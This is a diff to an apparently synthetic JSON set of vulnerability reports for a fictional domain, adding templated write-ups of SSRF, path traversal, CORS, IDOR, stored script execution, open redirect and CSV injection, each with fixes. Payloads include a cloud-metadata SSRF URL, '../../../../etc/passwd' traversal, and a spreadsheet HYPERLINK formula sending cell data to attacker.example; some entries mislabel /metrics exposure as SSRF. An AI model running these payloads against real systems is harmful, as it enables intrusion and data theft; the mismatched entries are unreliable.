+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rabenbrunn-it.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16685,7 +16814,8 @@
           "offset": "3d 21h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rabenbrunn-it.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16840,7 +16970,8 @@
           "offset": "4d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rabenbrunn-it.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16979,7 +17110,8 @@
           "offset": "7d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17110,7 +17242,8 @@
           "offset": "8d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -17206,7 +17339,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rabenbrunn-it.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17358,7 +17492,8 @@
           "offset": "7d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17469,7 +17604,8 @@
           "offset": "4d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17608,7 +17744,8 @@
           "offset": "7d 14h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -17738,7 +17875,8 @@
           "offset": "1d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.rabenbrunn-it.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17881,7 +18019,8 @@
           "offset": "7d 13h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rabenbrunn-it.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18009,7 +18148,8 @@
           "offset": "10h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18169,7 +18309,8 @@
           "offset": "8d 8h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18272,7 +18413,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.rabenbrunn-it.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18417,7 +18559,8 @@
           "offset": "7d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18539,7 +18682,8 @@
           "offset": "4d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rabenbrunn-it.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18674,7 +18818,8 @@
           "offset": "4d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rabenbrunn-it.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18788,7 +18933,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18934,7 +19080,8 @@
           "offset": "2d 17h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19053,7 +19200,8 @@
           "offset": "1d 9h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19161,7 +19309,8 @@
           "offset": "4d 21h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19292,7 +19441,8 @@
           "offset": "3d 6h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -19431,7 +19581,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19566,7 +19717,8 @@
           "offset": "5d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.rabenbrunn-it.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19726,7 +19878,8 @@
           "offset": "7d 7h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19892,7 +20045,8 @@
           "offset": "5d 23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20031,7 +20185,8 @@
           "offset": "8d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.rabenbrunn-it.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20179,7 +20334,8 @@
           "offset": "8d 18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -20343,7 +20499,8 @@
           "offset": "2d 10h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20490,7 +20647,8 @@
           "offset": "2d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rabenbrunn-it.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20633,7 +20791,8 @@
           "offset": "5d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.rabenbrunn-it.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20776,7 +20935,8 @@
           "offset": "3d 2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
